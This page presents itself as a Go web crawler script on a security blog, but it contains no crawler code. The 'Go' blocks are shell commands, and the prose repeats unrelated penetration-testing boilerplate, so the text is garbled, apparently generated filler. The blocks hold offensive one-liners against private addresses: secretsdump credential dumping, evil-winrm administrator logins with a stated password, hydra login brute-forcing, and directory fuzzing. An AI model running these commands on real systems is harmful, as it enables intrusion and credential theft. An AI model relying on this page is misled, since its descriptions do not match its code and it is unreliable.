---
TitleSEO: "Web Crawler and Spider in Go | ZureFX"
TitlePost: "Web Crawler and Spider — Go"
Author: "ZureFX"
Description: "A Go script for web crawler and spider. Built for security research and automation."
Keywords: "bash, tool, automation, rust, go"
URL: "https://zurefx.github.io/scripting/script-web-crawler-and-spider-693.html"
URL_IMAGES: ""
Date: "2024-06-24"
Tags: "Bash, Tool, Automation, Rust, Go"
Section: "scripting"
Lang: "en"
main_img: "script-web-crawler-and-spider-693"
Permalink: "/scripting/script-web-crawler-and-spider-693.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `evil-winrm`
- `ligolo-ng`
- `psexec`

## Implementation

### Core Logic

The kernel version was outdated and vulnerable to a publicly known exploit. Authentication bypass was achieved through careful manipulation of the login mechanism.

```go
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.45.66.84/FUZZ
feroxbuster -h
```

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials.

### Helper Functions

The scheduled task ran with elevated privileges and could be abused for escalation. The scheduled task ran with elevated privileges and could be abused for escalation.

```go
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.231.59
```

## Usage

### Basic Usage

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

```bash
evil-winrm -i 10.19.37.254 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.109.10.72/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.74.215.233/FUZZ
gobuster dir -u http://10.47.17.38/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality. The backup files contained sensitive information that should not have been accessible.

```bash
evil-winrm -i 10.25.71.143 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.131.39 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

## Output

### Example Output

The backup files contained sensitive information that should not have been accessible. The scheduled task ran with elevated privileges and could be abused for escalation.

```
[+] Scanning target...
[+] Found 17 results
[+] Done in 25.48s
```
